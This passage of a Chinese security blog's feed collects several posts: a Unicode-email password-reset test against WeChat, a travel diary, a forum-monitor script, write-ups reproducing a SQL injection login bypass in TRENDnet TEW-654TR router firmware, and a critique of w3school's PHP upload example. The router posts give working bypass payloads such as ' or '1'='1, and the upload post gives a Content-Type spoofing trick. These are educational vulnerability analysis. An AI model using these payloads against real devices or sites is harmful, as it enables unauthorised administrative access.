<h1 id="对微信的测试记录">对微信的测试记录</h1><p>实际中的场景比较少，大部分产品都会对用户登录名做白名单限制了。经过一番寻找发现微信的绑定邮箱是支持unicode的，而且是邮箱的用户名和域名部分都支持unicode。当然最后的测试结果是不存在这个漏洞。作为一个典型的测试过程记录一下。</p>
<h2 id="搭建支持unicode用户名的邮件服务器">搭建支持unicode用户名的邮件服务器</h2><p>使用iredmail方便快速搭建邮件服务器。然后发现iredmail对用户名也是有过滤的。代码在iRedAdmin-0.6.1/libs/iredutils.py 中的is_email方法。修改该方法直接返回True,不检查邮件用户名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">######################&#10;# Regular expressions.&#10;#&#10;# Email.&#10;reEmail = r&#39;&#39;&#39;[\w\-][\w\-\.\+\=]*@[\w\-][\w\-\.]*\.[a-zA-Z0-9\-]&#123;2,15&#125;&#39;&#39;&#39;&#10;&#10;# Domain.&#10;reDomain = r&#39;&#39;&#39;[\w\-][\w\-\.]*\.[a-z0-9\-]&#123;2,15&#125;&#39;&#39;&#39;&#10;&#10;# End Regular expressions.&#10;####&#10;&#10;#####################################&#10;# Pre-defined values of SQL functions.&#10;sqlUnixTimestamp = web.sqlliteral(&#39;UNIX_TIMESTAMP()&#39;)&#10;&#10;#####&#10;&#10;##############&#10;# Validators&#10;#&#10;INVALID_EMAIL_CHARS = &#39;~!#$%^&#38;*()\\/\ &#39;&#10;INVALID_DOMAIN_CHARS = &#39;~!#$%^&#38;*()+\\/\ &#39;&#10;&#10;&#10;def is_email(s):&#10;    #return True &#30452;&#25509;&#36820;&#22238;true&#65292;&#19981;&#26816;&#26597;email&#21517;&#31216;&#21512;&#27861;&#24615;&#12290;&#10;    s = str(s)&#10;    if len(set(s) &#38; set(INVALID_EMAIL_CHARS)) &#62; 0 \&#10;       or &#39;.&#39; not in s \&#10;       or s.count(&#39;@&#39;) != 1:&#10;        return False&#10;&#10;    reCompEmail = re.compile(reEmail + &#39;$&#39;, re.IGNORECASE)&#10;    if reCompEmail.match(s):&#10;        return True&#10;    else:&#10;        return False</span><br></pre></td></tr></table></figure>
<p><img src="/images/unicodesec2.png" alt="image"></p>
<p>然后发现依然无法收到邮件，发现服务器返回505。拒绝了含有unicode字符的邮箱。</p>
<p><img src="/images/unicodesec3.png" alt="image"></p>
<p>采用的解决方式在数据库中插入了一条域名的邮箱，转发到一个正常的邮箱。这样可以接受这个域名所有的邮件。</p>
<p><img src="/images/unicode4.png" alt="image"></p>
<p>因为iredmail默认开启了SSL，为了调试，查看具体的smtp信息，关闭了SSL，直接明文传。</p>
<h2 id="绑定邮箱以及重置密码">绑定邮箱以及重置密码</h2><p>微信邮箱绑定支持unicode字符的邮箱。<br><img src="/images/unicodesec5.png" alt="image"></p>
<p>绑定邮箱后，重置密码。</p>
<p><img src="/images/unicodesec6.png" alt="image"> </p>
<p>正常重置了自己的密码。链接中的email字段是base64编码的。解码出来是含有unicode字符的邮箱。所以微信的重置密码业务逻辑中没有标准化unicode字符这个处理。不存在unicode同形字引起的漏洞。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;历史上的安全漏洞&quot;&gt;历史上的安全漏洞&lt;/h1&gt;&lt;h2 id=&quot;spotify的漏洞&quot;&gt;spotify的漏洞&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.spotify.com/2013/06/18/creative-usernames/&quot; targe
    
    </summary>
    
      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>esp8266芯片相关</title>
    <link href="http://xdxd.love/2016/10/09/esp8266%E8%8A%AF%E7%89%87%E7%9B%B8%E5%85%B3/"/>
    <id>http://xdxd.love/2016/10/09/esp8266芯片相关/</id>
    <published>2016-10-09T09:11:15.000Z</published>
    <updated>2016-10-09T09:20:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="相关工具">相关工具</h1><p><a href="http://espressif.com/en/support/download/other-tools?keys=&amp;field_type_tid%5B%5D=14" target="_blank" rel="external">flash烧写工具</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;相关工具&quot;&gt;相关工具&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://espressif.com/en/support/download/other-tools?keys=&amp;amp;field_type_tid%5B%5D=14&quot; target=&quot;_blank&quot; r
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>台湾游记</title>
    <link href="http://xdxd.love/2016/10/09/%E5%8F%B0%E6%B9%BE%E6%B8%B8%E8%AE%B0/"/>
    <id>http://xdxd.love/2016/10/09/台湾游记/</id>
    <published>2016-10-09T07:23:23.000Z</published>
    <updated>2016-10-11T01:24:31.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="吐槽">吐槽</h2><p><a href="http://bbs.qyer.com/forum-52-0-1-1.html?#gotonav" target="_blank" rel="external">穷游网台湾精华帖</a>，感觉穷游上的游记更应该像是攻略。这样的游记可以给后来者很多参考，提供很多有用的信息，穷游貌似也主动引导用户这么写。但是完全按照攻略的旅行岂不是成了另外一种形式的跟团游。几年以前放弃跟团，开始自助旅行。这次的经历发现各种攻略越来越成熟，但是攻略的内容只能依赖一半吧。完全按照攻略的旅行，也没有太多新意。</p>
<h2 id="最佳体验">最佳体验</h2><p>从台东到花莲的绿皮小火车不错。已经没几个人坐了。我们坐的时候整个火车不超过10个人，所以我们自己占了一节车厢。车厢与车厢之间还是露天的。窗户可以打开。一路上很多隧道，很有恐怖电影的感觉。尤其是在隧道前面停车的时候，车刚启动，还没有电，进入隧道就是全黑的。吓死宝宝了。当然，坐这个车是为了看沿途的海景，只要天气好才能看到美丽的海景。</p>
<p>在垦丁骑个电瓶车，到处晃悠着去看海的感觉也不错。就是天气太好，晒了半天就掉了一层皮。白沙湾可以看到亮瞎眼睛的星星，非常多的星星。</p>
<p>台湾的鸡排很好吃。自由广场修的不错。故宫空调有点冷。除了美丽的环境，在中正纪念堂也可以感受到从另一个角度看的历史。所以，什么才是真相。</p>
<h2 id="如果有下次">如果有下次</h2><p>单个地点的深度游也许可以更好。走马观花只能拍拍照，像当地人一样去生活才能感受到更多。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;吐槽&quot;&gt;吐槽&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://bbs.qyer.com/forum-52-0-1-1.html?#gotonav&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;穷游网台湾精华帖&lt;/a&gt;，感觉穷游上的游记更应该像是攻略
    
    </summary>
    
      <category term="人生苦短" scheme="http://xdxd.love/categories/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD/"/>
    
    
  </entry>
  
  <entry>
    <title>小脚本之监控论坛帖子更新并发送邮件通知</title>
    <link href="http://xdxd.love/2016/09/26/%E5%B0%8F%E8%84%9A%E6%9C%AC%E4%B9%8B%E7%9B%91%E6%8E%A7%E8%AE%BA%E5%9D%9B%E5%B8%96%E5%AD%90%E6%9B%B4%E6%96%B0%E5%B9%B6%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E9%80%9A%E7%9F%A5/"/>
    <id>http://xdxd.love/2016/09/26/小脚本之监控论坛帖子更新并发送邮件通知/</id>
    <published>2016-09-26T06:19:44.000Z</published>
    <updated>2016-11-14T02:25:05.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="需求">需求</h2><p>想要监控某个论坛是否有更新帖。如果有帖子更新并且标题符合某种条件就发送邮件通知</p>
<a id="more"></a>
<h2 id="实现">实现</h2><p>用python来实现比较简单，不到100行代码。用requests进行http请求，BeautifulSoup进行html解析。为了加快请求响应速度，设置useragent为手机的useragent，这样子就可以返回手机页面。</p>
<p>编写一个函数获取第一条帖子的标题。这里的例子为discuz论坛。</p>
<pre><code><span class="function"><span class="keyword">def</span> <span class="title">getnewesttitle</span><span class="params">()</span>:</span>
    url = <span class="string">'http://www.test.net/forum.php?mod=forumdisplay&amp;fid=33&amp;filter=author&amp;orderby=dateline'</span>
    headers = {<span class="string">'user-agent'</span>: <span class="string">'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36'</span>}
    r = requests.get(url, headers=headers)
    soup = BeautifulSoup(r.text)
    newest = soup.find(<span class="string">'span'</span>,class_=<span class="string">'by'</span>)
    <span class="keyword">return</span> newest.parent.text
</code></pre><p>主要逻辑为运行时先获取第一条帖子的标题，并保存。然后不断循环获取第一条帖子的标题，如果跟之前保存的不一样，就认为有帖子更新。</p>
<pre><code>newesttitle = <span class="function"><span class="title">getnewesttitle</span><span class="params">()</span></span>
while True:
    try:
        thenexttitle = <span class="function"><span class="title">getnewesttitle</span><span class="params">()</span></span>
        <span class="function"><span class="title">print</span><span class="params">(<span class="string">'monitoring'</span>)</span></span>
        print newesttitle.<span class="function"><span class="title">encode</span><span class="params">(<span class="string">'utf-8'</span>)</span></span>
        print thenexttitle.<span class="function"><span class="title">encode</span><span class="params">(<span class="string">'utf-8'</span>)</span></span>
        <span class="keyword">if</span> thenexttitle != newesttitle:
            newesttitle = thenexttitle
            <span class="function"><span class="title">send_mail</span><span class="params">(smtp_user, smtp_pass, thenexttitle.strip()</span></span>, thenexttitle.<span class="function"><span class="title">strip</span><span class="params">()</span></span>)
        <span class="keyword">else</span>:
            pass
    except RuntimeError:
        <span class="function"><span class="title">print</span><span class="params">(RuntimeError)</span></span>
    <span class="tag">time</span>.<span class="function"><span class="title">sleep</span><span class="params">(<span class="number">1</span>)</span></span>
</code></pre><p>发送邮件采用QQ邮箱，用sender模块。</p>
<pre><code><span class="function"><span class="keyword">def</span> <span class="title">send_mail</span><span class="params">(smtp_user, smtp_pass, subject=<span class="string">'test'</span>, body=<span class="string">'test'</span>, sendto=sendto, smtp_server=<span class="string">'smtp.qq.com'</span>,
              smtp_port=<span class="number">465</span>)</span>:</span>
    mail = Mail(smtp_server, port=smtp_port, username=smtp_user, password=smtp_pass, use_tls=<span class="keyword">False</span>, use_ssl=<span class="keyword">True</span>,
                debug_level=<span class="keyword">None</span>)
    mail.send_message(subject, fromaddr=smtp_user, to=sendto, body=body)
</code></pre><h2 id="Supervisord">Supervisord</h2><p>使用Supervisord做进程管理，如果程序挂掉，可以自动重启。</p>
<p>supervisord配置为：</p>
<pre><code><span class="title">[program:gettahua]</span>
<span class="setting">command=<span class="value">python get.py</span></span>
<span class="comment">;numprocs=1                 ; 默认为1</span>
<span class="comment">;process_name=%(program_name)s   ; 默认为 %(program_name)s，即 [program:x] 中的 x</span>
<span class="setting">directory=<span class="value">/root/ ; 执行 command 之前，先切换到工作目录</span></span>
<span class="setting">user=<span class="value">root            ; 使用 oxygen 用户来启动该进程</span></span>
<span class="comment">; 程序崩溃时自动重启，重启次数是有限制的，默认为3次</span>
<span class="setting">autorestart=<span class="value"><span class="keyword">true</span></span></span>
<span class="setting">startretries=<span class="value"><span class="number">9999999999</span></span></span>
<span class="setting">redirect_stderr=<span class="value"><span class="keyword">true</span>        ; 重定向输出的日志</span></span>
<span class="setting">stdout_logfile = <span class="value">/var/log/test.log</span></span>
<span class="setting">loglevel=<span class="value">info</span></span>
</code></pre><p>然后就可以安心干活，不用盯着论坛刷帖了~~</p>
<h2 id="参考资料">参考资料</h2><p><a href="http://www.cnblogs.com/restran/p/4854623.html" target="_blank" rel="external">Python 进程管理工具 Supervisor 使用教程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;需求&quot;&gt;需求&lt;/h2&gt;&lt;p&gt;想要监控某个论坛是否有更新帖。如果有帖子更新并且标题符合某种条件就发送邮件通知&lt;/p&gt;
    
    </summary>
    
      <category term="折腾不止" scheme="http://xdxd.love/categories/%E6%8A%98%E8%85%BE%E4%B8%8D%E6%AD%A2/"/>
    
    
      <category term="python" scheme="http://xdxd.love/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>逆向路由器固件之动态调试</title>
    <link href="http://xdxd.love/2016/09/20/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    <id>http://xdxd.love/2016/09/20/逆向路由器固件之动态调试/</id>
    <published>2016-09-20T09:09:52.000Z</published>
    <updated>2016-09-22T06:21:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文根据devttyS0的教程<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/" target="_blank" rel="external">Exploiting Embedded Systems – Part 2</a>和<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-3/" target="_blank" rel="external">Exploiting Embedded Systems – Part 3</a>复现Trendnet一个路由器的SQL注入漏洞分析过程。部门内容直接翻译引用自原文，可以看做是原文的翻译整理。</p>
<p>相关的环境搭建<a href="http://bbs.pediy.com/showthread.php?t=212369" target="_blank" rel="external">详细的路由器漏洞分析环境搭建教程</a>。</p>
<h2 id="静态分析">静态分析</h2><p>存在漏洞的固件<a href="http://download.trendnet.com/TEW-654TR/firmware/" target="_blank" rel="external">下载地址FW_TEW-654TR_v1.0R(1.10.12).zip</a>,最新版固件<a href="http://www.trendnet.com/support/supportdetail.asp?prod=175_TEW-654TR" target="_blank" rel="external">下载地址</a></p>
<p>使用binwalk解包：</p>
<p><img src="/images/nixiangmips1.png" alt=""></p>
<p>查看登录接口的URL和参数，在解包的文件中找到my_cgi.cgi文件。</p>
<p><img src="/images/nixiangmips2.png" alt=""></p>
<p>在my_cgi.cgi中查找user_name和user_pwd两个参数。</p>
<p><img src="/images/nixiangmips3.png" alt=""></p>
<p>看起来<code>select level from user where user_name=&#39;%s&#39; and user_pwd=&#39;%s&#39;</code>像是登录的时候查询SQL的参数，使用IDA载入my_cgi.cgi。查询”select level from user where user_name“字符串，可以定位到do_login函数。</p>
<p><img src="/images/nixiangmips4.png" alt=""></p>
<h2 id="动态分析">动态分析</h2><p>分析do_login函数，在exec_sql函数执行之前下断点。<br><img src="/images/nixiangmips5.png" alt=""></p>
<p>使用如下脚本运行my_cgi.cgi:</p>
<p>#!/bin/bash</p>
<pre><code>INPUT=<span class="string">"<span class="variable">$1</span>"</span>
LEN=$(<span class="built_in">echo</span> -n <span class="string">"<span class="variable">$INPUT</span>"</span> | wc -c)
PORT=<span class="string">"1234"</span>
<span class="keyword">if</span> [ <span class="string">"<span class="variable">$LEN</span>"</span> == <span class="string">"0"</span> ] || [ <span class="string">"<span class="variable">$INPUT</span>"</span> == <span class="string">"-h"</span> ] || [ <span class="string">"<span class="variable">$UID</span>"</span> != <span class="string">"0"</span> ]
<span class="keyword">then</span>
    <span class="built_in">echo</span> <span class="operator">-e</span> <span class="string">"\nUsage: sudo <span class="variable">$0</span> &lt;POST data&gt;\n"</span>
    <span class="built_in">exit</span> <span class="number">1</span>
<span class="keyword">fi</span>
cp $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu
<span class="built_in">echo</span> <span class="string">"<span class="variable">$INPUT</span>"</span> | chroot . qemu -E REQUEST_METHOD=<span class="string">"POST"</span> -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">"multipart/x-form-data"</span> -E REMOTE_ADDR=<span class="string">"1.1.1.100"</span> -g <span class="variable">$PORT</span> /usr/bin/my_cgi.cgi <span class="number">2</span>&gt;/dev/null
</code></pre><p>需要放在解压出来的squashfs-root目录下执行。</p>
<pre><code>bash cgi.sh <span class="string">"request=login&amp;user_name=admin&amp;user_pwd='<span class="variable">%20or</span><span class="variable">%20</span>'1'<span class="variable">%3D</span>'1"</span>
</code></pre><p>然后IDA连接到GDB端口进行调试，具体方法参考<a href="http://bbs.pediy.com/showthread.php?t=212369" target="_blank" rel="external">详细的路由器漏洞分析环境搭建教程</a>。按F9执行程序到exec_sql的断点处。可以看到寄存器$a1的值为指向sql字符串的指针。</p>
<p><img src="/images/nixiangmips6.png" alt=""><br>在hex view中跳转到对应的地址，可以看到sql字符串的值为：</p>
<pre><code><span class="operator"><span class="keyword">select</span> <span class="keyword">level</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_name=<span class="string">'admin'</span> <span class="keyword">and</span> user_pwd=<span class="string">''</span> <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1'</span></span>
</code></pre><p>表明我们输入的字符串已经拼接到SQL语句中。</p>
<p><img src="/images/nixiangmips7.png" alt=""></p>
<p>采用同样的方式动态调试最新版固件，可以发现漏洞已经修复。最新版对输入的参数进行了长度检查，并且检查是否含有单引号。可见这个点除了SQL，应该是也存在溢出的。</p>
<p>进行长度检查。<br><img src="/images/nixiangmips8.png" alt=""></p>
<p>检查是否存在单引号避免SQL注入。<br><img src="/images/nixiangmips9.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文根据devttyS0的教程&lt;a href=&quot;http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Exploiting Em
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
      <category term="mips" scheme="http://xdxd.love/tags/mips/"/>
    
  </entry>
  
  <entry>
    <title>逆向路由器固件之SQL注入</title>
    <link href="http://xdxd.love/2016/09/20/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://xdxd.love/2016/09/20/逆向路由器固件之SQL注入/</id>
    <published>2016-09-20T08:44:34.000Z</published>
    <updated>2016-09-20T08:50:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>翻译自<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/" target="_blank" rel="external">devttys0</a>,发表在<a href="http://www.freebuf.com/vuls/76755.html" target="_blank" rel="external">freebuf</a></p>
<h2 id="另寻他径">另寻他径</h2><p>在前面的内容中，我们使用TEW-654TR路由器的tftp服务实现了获取目标的管理权限。但是要是tftp没有开放到外网怎么办？另寻他径：在这一篇中会我们来分析一个web应用上的漏洞。</p>
<p>初步分析</p>
<p><img src="http://image.3001.net/images/20150831/1441019914573.png" alt=""></p>
<p>使用代理软件抓登录时候的数据包，可以看到发送的http请求如上图所示。数据发送给了my_cgi.cgi这个脚本。我们分析一下这个文件看看。</p>
<pre><code>➜  rootfs git:(master) ✗ find . -name my_cgi<span class="class">.cgi</span>
./usr/bin/my_cgi<span class="class">.cgi</span>
➜  rootfs git:(master) ✗ file ./usr/bin/my_cgi<span class="class">.cgi</span>
./usr/bin/my_cgi<span class="class">.cgi</span>: ELF <span class="number">32</span>-bit LSB executable, MIPS, MIPS-II version <span class="number">1</span> (SYSV), dynamically linked (uses shared libs), stripped
</code></pre><p>通过抓包知道用户在登录页面输入的两个参数分别是’user_name’和’user_pwd’，那么我们在CGI脚本中搜索这两个字符串看看。</p>
<p><img src="http://image.3001.net/images/20150831/14410199362768.png" alt="my_cgi_login2.png
"></p>
<p>有几行字符串看起来是SQL查询的语句，尤其是：</p>
<pre><code><span class="operator"><span class="keyword">select</span> <span class="keyword">level</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_name=<span class="string">'%s'</span> <span class="keyword">and</span> user_pwd=<span class="string">'%s'</span></span>
</code></pre><p>看起来应该是根据用户名和密码去数据库查询，看密码是否正确。上一篇文章的分析我们可以知道，这个路由器是使用SQLite做数据库存储密码的。</p>
<p>使用IDA载入my_cgi.cgi。查询”select level from user where user_name“字符串，可以定位到do_login函数。</p>
<p><img src="http://image.3001.net/images/20150831/14410200092005.png" alt="my_cgi_login3.png"></p>
<h2 id="假设&amp;猜想">假设&amp;猜想</h2><p>用户提交的用户名和密码大概是传递给sprintf函数生成SQL语句。存储在sql变量中，最后进入exec_sql函数。看起来这个过程没有对数据进行转义。除非数据在进入do_login函数之前或者在exec_sql中有做转义，不然很可能存在SQL注入的漏洞。如果我们的假设是正确的，数据没有经过处理进入了SQL语句中，那么我们可以使用最传统的万能密码来绕过登录验证：</p>
<pre><code><span class="string">' or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span>
</code></pre><p>最后执行的sql就会变成</p>
<pre><code><span class="operator"><span class="keyword">select</span> <span class="keyword">level</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_name=<span class="string">'admin'</span> <span class="keyword">and</span> user_pwd=<span class="string">''</span> <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1'</span></span>
</code></pre><p>这样查询语句就会返回成功的结果。</p>
<h2 id="验证猜想">验证猜想</h2><p>我们实验一下：</p>
<p><img src="http://image.3001.net/images/20150831/14410200328237.png" alt="my_cgi_login4.png"></p>
<p>果然跟我们预期的一样。这里需要注意的是能够以管理员身份登陆是需要一定运气的。我们构造的SQL语句where条件是or 1=1所以会返回所有的数据。恰好管理员的记录是第一条所以以管理员的身份登陆了。如果第一条是一个普通用户的数据，那么就会以普通用户的身份登陆了。为了确保一定以管理员身份登陆，可以构造如下语句：</p>
<pre><code>' or level = (<span class="operator"><span class="keyword">select</span> <span class="keyword">level</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">level</span> <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">1</span>)<span class="comment">/*</span></span>
</code></pre><p>上面这个语句可以确保最后查询出来的数据室level最高的用户的数据。</p>
<p>这次我们终于看到了逆向分析的冰山一角。下一篇将会讨论使用Qemu虚拟机运行路由器固件，动态调试相关的内容。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;翻译自&lt;a href=&quot;http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;devttys0&lt;/a&gt;,发表在&lt;a href=&quot;
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
      <category term="mips" scheme="http://xdxd.love/tags/mips/"/>
    
  </entry>
  
  <entry>
    <title>w3school上示例代码的安全漏洞</title>
    <link href="http://xdxd.love/2016/09/14/w3school%E4%B8%8A%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"/>
    <id>http://xdxd.love/2016/09/14/w3school上示例代码的安全漏洞/</id>
    <published>2016-09-14T05:51:05.000Z</published>
    <updated>2016-09-14T06:59:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个漏洞原理本身比较简单，而且很古老了。这里主要想说明一下，在w3school这样的平台上还存在着这样的代码说明我们对编写安全的代码还是不够重视。w3school上的示例对于初学者简单明了。很多人应该都看这个网站学习过web相关的知识。</p>
<p>我们用Google搜索<code>php 文件上传</code>或者英文的<code>php file upload</code> </p>
<p><img src="/images/phpupload2.png" alt=""><br><img src="/images/phpupload1.png" alt=""></p>
<p>第一个结果就是w3school的教学页面，而这个教程中给出的示例代码是存在安全漏洞的。</p>
<p>完整的代码如下：<a href="http://www.w3school.com.cn/php/php_file_upload.asp" target="_blank" rel="external">参考地址</a></p>
<p>上传的表单：</p>
<pre><code><span class="tag">&lt;<span class="title">html</span>&gt;</span>
<span class="tag">&lt;<span class="title">body</span>&gt;</span>
<span class="tag">&lt;<span class="title">form</span> <span class="attribute">action</span>=<span class="value">"upload_file.php"</span> <span class="attribute">method</span>=<span class="value">"post"</span>
<span class="attribute">enctype</span>=<span class="value">"multipart/form-data"</span>&gt;</span>
<span class="tag">&lt;<span class="title">label</span> <span class="attribute">for</span>=<span class="value">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="title">label</span>&gt;</span>
<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"file"</span> <span class="attribute">name</span>=<span class="value">"file"</span> <span class="attribute">id</span>=<span class="value">"file"</span> /&gt;</span> 
<span class="tag">&lt;<span class="title">br</span> /&gt;</span>
<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">name</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"Submit"</span> /&gt;</span>
<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
<span class="tag">&lt;/<span class="title">html</span>&gt;</span>
</code></pre><p>处理的php脚本：</p>
<pre><code><span class="php"><span class="preprocessor">&lt;?php</span>
<span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)
|| (<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)
|| (<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>))
&amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">20000</span>))
  {
  <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)
    {
    <span class="keyword">echo</span> <span class="string">"Return Code: "</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;
    }
  <span class="keyword">else</span>
    {
    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br /&gt;"</span>;
    <span class="keyword">echo</span> <span class="string">"Type: "</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br /&gt;"</span>;
    <span class="keyword">echo</span> <span class="string">"Size: "</span> . (<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" Kb&lt;br /&gt;"</span>;
    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>] . <span class="string">"&lt;br /&gt;"</span>;
    <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>]))
      {
      <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;
      }
    <span class="keyword">else</span>
      {
      move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],
      <span class="string">"upload/"</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>]);
      <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>];
      }
    }
  }
<span class="keyword">else</span>
  {
  <span class="keyword">echo</span> <span class="string">"Invalid file"</span>;
  }
<span class="preprocessor">?&gt;</span></span>
</code></pre><p>文中也多次提到了文件上传的安全问题。<br><img src="/images/phpupload4.png" alt=""><br><img src="/images/phpupload5.png" alt=""></p>
<p>而为了安全，最后示例的代码中加了限制，只允许用户上传gif，jpg格式的图片。而这个限制，是通过<code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code>来限制的。做安全的同学都知道，这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改<code>Content-Type: image/jpeg</code> 就可以绕过这个检查，上传任意类型的文件。</p>
<p><img src="/images/phpupload6.png" alt=""></p>
<p>所以，当我们用Google搜索php文件上传，给出的第一个示例代码是存在安全漏洞的。编写安全的代码，任重而道远。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个漏洞原理本身比较简单，而且很古老了。这里主要想说明一下，在w3school这样的平台上还存在着这样的代码说明我们对编写安全的代码还是不够重视。w3school上的示例对于初学者简单明了。很多人应该都看这个网站学习过web相关的知识。&lt;/p&gt;
&lt;p&gt;我们用Google搜索
    
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="php" scheme="http://xdxd.love/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>一个blind XXE漏洞利用工具XXEinjector</title>
    <link href="http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AAblind-XXE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/09/08/一个blind-XXE漏洞利用分析/</id>
    <published>2016-09-08T02:22:01.000Z</published>
    <updated>2016-09-09T01:58:19.000Z</updated>
    
